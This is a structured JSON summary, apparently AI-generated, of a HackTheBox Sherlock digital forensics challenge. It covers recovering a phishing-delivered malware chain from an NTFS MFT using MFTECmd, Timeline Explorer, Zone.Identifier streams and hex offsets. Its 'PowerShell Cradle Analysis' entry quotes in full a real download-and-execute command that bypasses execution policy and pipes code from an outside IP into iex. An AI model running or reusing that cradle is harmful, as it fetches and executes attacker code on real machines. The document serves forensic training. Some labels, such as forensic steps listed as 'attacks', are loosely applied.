{
  "writeup_id": "Htb_Sherlock_Bft",
  "scenario_fingerprint": {
    "scenario_name": "windows_mft_forensics_malware_analysis",
    "primary_services": [
      "filesystem",
      "ntfs",
      "mft"
    ],
    "port_signature": "n/a",
    "service_combination": "filesystem_forensics",
    "os_family": "windows",
    "environment_type": "digital_forensics",
    "entry_vector": "email_attachment_zip",
    "privilege_path": "file_download_to_c2_execution",
    "attack_complexity": "easy",
    "estimated_time": "60-90 minutes",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "mft_resident_files",
      "nested_zip_archives",
      "powershell_cradle_execution",
      "zone_identifier_artifacts"
    ],
    "environmental_clues": [
      "ntfs_filesystem",
      "mft_file_present",
      "email_delivered_malware",
      "google_drive_download_url"
    ],
    "similar_scenarios": [
      "htb_sherlock_dfir",
      "windows_forensics_challenges"
    ],
    "unique_aspects": [
      "mft_hex_offset_analysis",
      "resident_file_recovery",
      "nested_archive_extraction",
      "powershell_c2_communication"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "MFT_Forensic_Analysis",
        "success_reason": "MFT contained complete file metadata and resident file contents",
        "prerequisite_indicators": [
          "mft_file_available",
          "forensic_tools_accessible",
          "file_system_artifacts_preserved"
        ],
        "recognition_patterns": [
          "MFT file size indicates active filesystem",
          "Recent timestamps in target timeframe",
          "Zone identifier files present"
        ],
        "failure_modes": [
          "mft_file_corrupted",
          "timestamps_wiped",
          "file_records_overwritten"
        ],
        "environmental_factors": [
          "ntfs_filesystem",
          "windows_operating_system",
          "file_download_via_browser"
        ],
        "success_probability": 0.95,
        "typical_timeframe": "30-60 minutes"
      },
      {
        "technique": "Zone_Identifier_Analysis",
        "success_reason": "Windows automatically creates Zone.Identifier alternate data streams for downloaded files",
        "prerequisite_indicators": [
          "file_downloaded_from_internet",
          "windows_security_zones_enabled",
          "alternate_data_streams_preserved"
        ],
        "recognition_patterns": [
          "Zone.Identifier:$DATA entries in MFT",
          "HostUrl field contains source URL",
          "ReferrerUrl shows email/web source"
        ],
        "failure_modes": [
          "ads_manually_removed",
          "file_copied_locally",
          "zone_identifier_disabled"
        ],
        "environmental_factors": [
          "default_windows_security_settings",
          "internet_explorer_security_zones",
          "file_downloaded_via_browser"
        ],
        "success_probability": 0.88,
        "typical_timeframe": "5-10 minutes"
      },
      {
        "technique": "MFT_Resident_File_Recovery",
        "success_reason": "Files under 1024 bytes stored directly in MFT records",
        "prerequisite_indicators": [
          "small_file_size",
          "mft_records_intact",
          "file_not_fragmented"
        ],
        "recognition_patterns": [
          "File size less than 1024 bytes",
          "Data runs show resident storage",
          "Complete file content in MFT record"
        ],
        "failure_modes": [
          "file_too_large",
          "mft_record_corrupted",
          "file_system_cleanup"
        ],
        "environmental_factors": [
          "ntfs_mft_structure",
          "small_malicious_payloads",
          "script_based_attacks"
        ],
        "success_probability": 0.92,
        "typical_timeframe": "15-30 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Stage-20240213T093324Z-001.zip initial download",
        "discovery_method": "MFT timestamp analysis and extension filtering",
        "why_critical": "Entry point for multi-stage malware delivery chain",
        "how_to_recognize": [
          "Suspicious filename with timestamp pattern",
          "Downloaded on target date",
          "Associated Zone.Identifier file present"
        ],
        "follow_up_actions": [
          "analyze_zone_identifier_contents",
          "trace_extraction_chain",
          "identify_final_payload"
        ]
      },
      {
        "discovery": "Google Drive as malware distribution",
        "discovery_method": "Zone.Identifier HostUrl analysis",
        "why_critical": "Reveals C2 infrastructure and delivery method",
        "how_to_recognize": [
          "drive.google.com in HostUrl field",
          "Direct download links to malicious content",
          "Legitimate service abuse"
        ],
        "follow_up_actions": [
          "report_malicious_google_drive_links",
          "analyze_similar_campaigns",
          "block_identified_urls"
        ]
      },
      {
        "discovery": "Nested zip extraction chain",
        "discovery_method": "Parent path analysis and timestamp correlation",
        "why_critical": "Anti-analysis technique to evade detection",
        "how_to_recognize": [
          "Multiple zip files with parent-child relationships",
          "Sequential extraction timestamps",
          "Decreasing file sizes in chain"
        ],
        "follow_up_actions": [
          "extract_all_archive_layers",
          "analyze_final_payload",
          "document_evasion_techniques"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "user_execution",
        "escalation_method": "PowerShell_Cradle_to_C2",
        "why_possible": "Batch file contained PowerShell download and execution commands",
        "recognition_signs": [
          "bat_file_in_final_archive",
          "powershell_cradle_commands",
          "resident_file_recovery_possible"
        ],
        "exploitation_path": "Email → Zip Download → Multi-stage Extraction → Batch Execution → PowerShell C2"
      },
      {
        "privilege_level": "initial_access",
        "escalation_method": "Social_Engineering_to_Code_Execution",
        "why_possible": "User manually downloaded and extracted malicious archives",
        "recognition_signs": [
          "email_delivered_malware",
          "invoice_themed_lures",
          "user_initiated_download"
        ],
        "exploitation_path": "Phishing Email → User Download → Manual Extraction → Code Execution"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Analyzing MFT file for malicious activity investigation",
        "decision": "Parse MFT with MFTECmd and filter by file extensions first",
        "reasoning": "MFT contains massive amounts of data, need systematic approach to identify suspicious files",
        "confidence": 0.95,
        "alternatives": [
          {
            "option": "manual_hex_analysis",
            "when": "if parsing tools unavailable"
          },
          {
            "option": "timeline_analysis",
            "when": "if specific timeframe known"
          }
        ],
        "success_indicators": [
          "csv_output_generated",
          "file_records_parsed",
          "timeline_explorer_loads_data"
        ],
        "next_decision": "filter_suspicious_extensions"
      },
      {
        "step": 2,
        "situation": "Multiple ZIP files found in MFT analysis",
        "decision": "Correlate timestamps and parent directories to identify download chain",
        "reasoning": "Nested zip extraction creates parent-child relationships visible in MFT",
        "confidence": 0.9,
        "prerequisites": [
          "mft_parsed",
          "extension_filter_applied"
        ],
        "success_indicators": [
          "parent_path_correlation_found",
          "timestamp_sequence_logical"
        ],
        "failure_fallbacks": [
          "zone_identifier_analysis",
          "creation_time_sorting"
        ]
      },
      {
        "step": 3,
        "situation": "Suspicious ZIP file identified with download origin needed",
        "decision": "Examine Zone.Identifier ADS for HostUrl IOC",
        "reasoning": "Windows attaches Zone.Identifier to downloaded files showing origin",
        "confidence": 0.95,
        "prerequisites": [
          "initial_zip_identified"
        ],
        "success_indicators": [
          "zone_identifier_found",
          "hosturl_extracted"
        ],
        "failure_fallbacks": [
          "browser_history_analysis",
          "network_logs_review"
        ]
      },
      {
        "step": 4,
        "situation": "Need to find final malicious payload in extraction chain",
        "decision": "Follow parent directory relationships through unzip sequence",
        "reasoning": "Each extraction creates files in directories named after parent zip",
        "confidence": 0.85,
        "prerequisites": [
          "zip_chain_identified"
        ],
        "success_indicators": [
          "final_payload_found",
          "execution_artifacts_present"
        ],
        "failure_fallbacks": [
          "search_executable_extensions",
          "recent_file_analysis"
        ]
      }
    ],
    "branching_logic": {
      "if_mft_parsing_succeeds": {
        "action": "apply_extension_filters_systematically",
        "tools": [
          "timeline_explorer",
          "mftecmd"
        ],
        "next_phase": "suspicious_file_identification"
      },
      "if_zip_chain_found": {
        "action": "trace_extraction_sequence",
        "alternatives": [
          "parent_path_correlation",
          "timestamp_analysis"
        ],
        "decision_criteria": "based_on_directory_structure_clarity"
      },
      "if_zone_identifier_present": {
        "action": "extract_hosturl_for_ioc",
        "purpose": "identify_c2_infrastructure",
        "tools": [
          "timeline_explorer",
          "hex_editor"
        ]
      },
      "if_small_malicious_file_found": {
        "action": "check_mft_resident_storage",
        "reasoning": "files_under_1024_bytes_stored_in_mft",
        "tools": [
          "hex_editor",
          "mft_offset_calculation"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_zone_identifier_for_downloaded_files",
        "reasoning": "provides_immediate_ioc_for_download_source",
        "applicability": "windows_forensic_investigations"
      },
      {
        "rule": "correlate_parent_paths_for_extraction_chains",
        "reasoning": "reveals_multi_stage_malware_deployment",
        "applicability": "nested_archive_analysis"
      },
      {
        "rule": "examine_mft_resident_files_for_small_payloads",
        "reasoning": "malicious_scripts_often_small_enough_for_mft_storage",
        "applicability": "files_under_1024_bytes"
      },
      {
        "rule": "use_timestamp_correlation_for_activity_sequencing",
        "reasoning": "multiple_timestamp_types_provide_detailed_timeline",
        "applicability": "mft_forensic_analysis"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "MFT_Forensic_Analysis",
        "mitre_id": "T1005",
        "required_services": [
          "ntfs_filesystem"
        ],
        "required_ports": [],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "ntfs_volume_present",
          "mft_file_accessible",
          "forensic_tools_available"
        ],
        "success_indicators": [
          "mft_file_extracted",
          "file_records_parseable",
          "timeline_data_available"
        ],
        "incompatible_with": [
          "encrypted_filesystem",
          "corrupted_mft",
          "non_ntfs_filesystem"
        ],
        "confidence_boosters": [
          "recent_file_activity",
          "malware_artifacts_present",
          "zone_identifier_streams"
        ],
        "typical_success_rate": 0.95,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "Zone_Identifier_Analysis",
        "mitre_id": "T1566.001",
        "required_services": [
          "ntfs_filesystem"
        ],
        "required_ports": [],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "downloaded_files_present",
          "alternate_data_streams_enabled",
          "internet_zone_marking_active"
        ],
        "success_indicators": [
          "zone_identifier_present",
          "hosturl_recoverable",
          "download_source_identified"
        ],
        "incompatible_with": [
          "ads_disabled",
          "files_created_locally",
          "zone_data_stripped"
        ],
        "confidence_boosters": [
          "email_attachment_indicators",
          "browser_download_patterns",
          "suspicious_domains"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "5-10 minutes"
      },
      {
        "technique": "MFT_Resident_File_Recovery",
        "mitre_id": "T1140",
        "required_services": [
          "ntfs_filesystem"
        ],
        "required_ports": [],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "small_files_under_1024_bytes",
          "mft_records_intact",
          "hex_editor_available"
        ],
        "success_indicators": [
          "file_content_in_mft",
          "resident_flag_set",
          "data_runs_embedded"
        ],
        "incompatible_with": [
          "large_files_only",
          "fragmented_mft",
          "overwritten_records"
        ],
        "confidence_boosters": [
          "script_files_present",
          "powershell_cradles",
          "c2_communications"
        ],
        "typical_success_rate": 0.9,
        "estimated_time": "15-25 minutes"
      }
    ],
    "environmental_detectors": {
      "ntfs_filesystem": {
        "port_indicators": [
          445,
          139
        ],
        "service_indicators": [
          "smb",
          "cifs"
        ],
        "banner_indicators": [
          "Windows",
          "NTFS"
        ],
        "confidence_threshold": 0.9
      },
      "windows_forensics": {
        "port_indicators": [
          135,
          445,
          3389
        ],
        "service_indicators": [
          "rpc",
          "smb",
          "rdp"
        ],
        "technology_indicators": [
          "mft",
          "ntfs",
          "ads"
        ],
        "confidence_threshold": 0.85
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "mft_analysis",
          "when": "ntfs_filesystem_detected",
          "reason": "comprehensive_file_system_visibility"
        },
        {
          "attack": "zone_identifier_extraction",
          "when": "downloaded_files_present",
          "reason": "reveals_attack_infrastructure"
        }
      ],
      "medium_priority": [
        {
          "attack": "resident_file_recovery",
          "when": "small_malicious_files_suspected",
          "reason": "recovers_deleted_malware_content"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "MFT Forensic Analysis",
        "mitre_id": "T1005",
        "category": "collection",
        "phase": "post_exploitation",
        "tools_used": [
          {
            "name": "MFTECmd",
            "command_template": "MFTECmd.exe -f '{mft_path}' --csv {output_dir} --csvf {output_file}",
            "actual_command": "MFTECmd.exe -f '.\\C\\$MFT' --csv . --csvf mft.csv",
            "output_pattern": "FILE records found: {count}",
            "effectiveness_rating": 5,
            "reliability": 0.98
          },
          {
            "name": "Timeline Explorer",
            "command_template": "GUI tool - open CSV file",
            "actual_command": "Open mft.csv in Timeline Explorer",
            "success_factors": [
              "csv_properly_formatted",
              "large_dataset_handling"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "mft_file_available",
          "zimmerman_tools_installed",
          "sufficient_disk_space"
        ],
        "success_indicators": [
          "csv_generated_successfully",
          "timeline_data_searchable",
          "file_metadata_accessible"
        ],
        "common_failures": [
          "corrupted_mft_file",
          "insufficient_permissions",
          "memory_limitations_large_datasets"
        ],
        "follow_up_techniques": [
          "zone_identifier_analysis",
          "file_carving",
          "timeline_correlation"
        ],
        "time_investment": "10-30 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Zone Identifier Analysis",
        "mitre_id": "T1553.005",
        "category": "defense_evasion",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "Timeline Explorer",
            "command_template": "Filter by Zone.Identifier in filename",
            "actual_command": "Filter Extension column for 'Zone.Identifier'",
            "output_pattern": "ZoneId={id}\\r\\nHostUrl={url}",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "mft_parsed_successfully",
          "downloaded_files_present",
          "zone_identifiers_preserved"
        ],
        "success_indicators": [
          "download_source_identified",
          "zone_id_correlates_internet",
          "host_url_provides_ioc"
        ],
        "common_failures": [
          "zone_identifiers_stripped",
          "manual_file_creation",
          "local_network_transfers"
        ],
        "follow_up_techniques": [
          "url_reputation_analysis",
          "network_traffic_correlation",
          "threat_intelligence_lookup"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "MFT Resident File Recovery",
        "mitre_id": "T1005",
        "category": "collection",
        "phase": "post_exploitation",
        "tools_used": [
          {
            "name": "HxD",
            "command_template": "Navigate to offset: {entry_number} * 1024",
            "actual_command": "Go to offset 0x16E3000 (23436 * 1024)",
            "output_pattern": "Raw file contents in MFT record",
            "effectiveness_rating": 4,
            "reliability": 0.9
          },
          {
            "name": "Python",
            "command_template": "with open('{mft_file}', 'rb') as f: f.seek({offset}); data = f.read(1024)",
            "actual_command": "Binary file extraction from calculated offset",
            "success_factors": [
              "file_under_900_bytes",
              "correct_offset_calculation"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "file_size_under_1024_bytes",
          "entry_number_identified",
          "hex_editor_available"
        ],
        "success_indicators": [
          "file_contents_visible_in_hex",
          "readable_text_recovered",
          "malicious_code_identified"
        ],
        "common_failures": [
          "incorrect_offset_calculation",
          "file_stored_externally",
          "corrupted_mft_record"
        ],
        "follow_up_techniques": [
          "malware_analysis",
          "c2_infrastructure_analysis",
          "powershell_deobfuscation"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "PowerShell Cradle Analysis",
        "mitre_id": "T1059.001",
        "category": "execution",
        "phase": "execution",
        "tools_used": [
          {
            "name": "Manual Analysis",
            "command_template": "Analyze PowerShell command structure",
            "actual_command": "powershell.exe -nol -w 1 -nop -ep bypass \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://43.204.110.203:6666/download/powershell/Om1hdHRpZmVzdGFW9uIGV0dw==') -UseBasicParsing|iex\"",
            "output_pattern": "C2 server communication established",
            "effectiveness_rating": 5,
            "reliability": 0.85
          }
        ],
        "prerequisites": [
          "powershell_available",
          "network_connectivity",
          "execution_policy_bypass"
        ],
        "success_indicators": [
          "c2_server_identified",
          "download_url_extracted",
          "execution_method_understood"
        ],
        "common_failures": [
          "network_blocking",
          "execution_policy_enforcement",
          "c2_server_offline"
        ],
        "follow_up_techniques": [
          "network_traffic_analysis",
          "c2_infrastructure_mapping",
          "payload_analysis"
        ],
        "time_investment": "5-10 minutes",
        "skill_level": "intermediate"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "MFTECmd",
        "use_case": "mft_parsing_and_analysis",
        "effectiveness_rating": 5,
        "reliability": 0.98,
        "learning_curve": "low",
        "essential_for": [
          "windows_forensics",
          "file_system_analysis"
        ],
        "alternatives": [
          "analyzeMFT",
          "mft2csv"
        ],
        "best_practices": [
          "use_with_timeline_explorer",
          "export_to_csv_for_analysis",
          "verify_record_counts_match_expectations"
        ]
      },
      {
        "tool": "Timeline Explorer",
        "use_case": "timeline_analysis_and_filtering",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "timeline_analysis",
          "large_dataset_investigation"
        ],
        "alternatives": [
          "excel",
          "splunk",
          "elastic_stack"
        ],
        "best_practices": [
          "use_filters_to_narrow_scope",
          "group_related_events",
          "correlate_timestamps_across_artifacts"
        ]
      },
      {
        "tool": "HxD",
        "use_case": "hex_editing_and_file_carving",
        "effectiveness_rating": 4,
        "reliability": 0.9,
        "learning_curve": "medium",
        "essential_for": [
          "binary_analysis",
          "file_recovery"
        ],
        "alternatives": [
          "010_editor",
          "hex_fiend",
          "xxd"
        ],
        "best_practices": [
          "calculate_offsets_carefully",
          "verify_file_signatures",
          "backup_before_modifications"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "mft_to_malware_recovery",
        "steps": [
          {
            "step": 1,
            "command": "MFTECmd.exe -f '.\\C\\$MFT' --csv . --csvf mft.csv",
            "purpose": "Parse MFT to CSV format",
            "expected_output": "CSV file with 171,927 file records"
          },
          {
            "step": 2,
            "command": "Open mft.csv in Timeline Explorer",
            "purpose": "Load parsed data for analysis",
            "expected_output": "Searchable timeline interface"
          },
          {
            "step": 3,
            "command": "Filter Extension column for 'zip'",
            "purpose": "Identify downloaded archives",
            "expected_output": "List of ZIP files with timestamps"
          },
          {
            "step": 4,
            "command": "Filter for Zone.Identifier files",
            "purpose": "Find download source information",
            "expected_output": "HostUrl and ZoneId data"
          },
          {
            "step": 5,
            "command": "Calculate offset: Entry_Number * 1024",
            "purpose": "Locate file in MFT",
            "expected_output": "Hex offset for file location"
          },
          {
            "step": 6,
            "command": "Navigate to offset in hex editor",
            "purpose": "Extract resident file contents",
            "expected_output": "Raw malicious PowerShell cradle"
          }
        ],
        "success_rate": 0.92,
        "typical_duration": "30-60 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "BFT",
      "difficulty": "Very Easy",
      "os": "Windows",
      "platform": "HackTheBox Sherlock",
      "release_date": "2024-04-04",
      "author": "CyberJunkie",
      "estimated_time": "30-45 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "low",
      "skill_level_required": "beginner",
      "primary_attack_vectors": [
        "email_phishing",
        "malicious_downloads",
        "powershell_cradle"
      ],
      "key_vulnerabilities": [
        "user_execution",
        "command_and_scripting_interpreter"
      ],
      "environment_type": "windows_endpoint_forensics",
      "real_world_relevance": "very_high",
      "learning_value": [
        "mft_analysis",
        "digital_forensics",
        "artifact_recovery",
        "timeline_analysis"
      ],
      "prerequisite_knowledge": [
        "basic_windows_forensics",
        "file_system_concepts",
        "hex_editing"
      ]
    },
    "categorization": {
      "primary_category": "digital_forensics",
      "subcategories": [
        "mft_analysis",
        "malware_analysis",
        "incident_response"
      ],
      "attack_types": [
        "initial_access",
        "execution",
        "command_and_control"
      ],
      "defensive_lessons": [
        "email_security",
        "download_monitoring",
        "mft_forensics",
        "powershell_logging"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Insider",
        "Noted",
        "Templated"
      ],
      "similarity_reasons": [
        "forensics_focus",
        "artifact_analysis",
        "malicious_downloads",
        "powershell_attacks"
      ],
      "unique_aspects": [
        "mft_resident_files",
        "zimmerman_tools",
        "zone_identifier_analysis"
      ],
      "difficulty_factors": [
        "guided_tool_usage",
        "clear_attack_chain",
        "well_defined_artifacts"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T14:16:08.329486",
    "original_file": "0xdf_writeups/Htb Sherlock Bft.md",
    "content_length": 18089,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}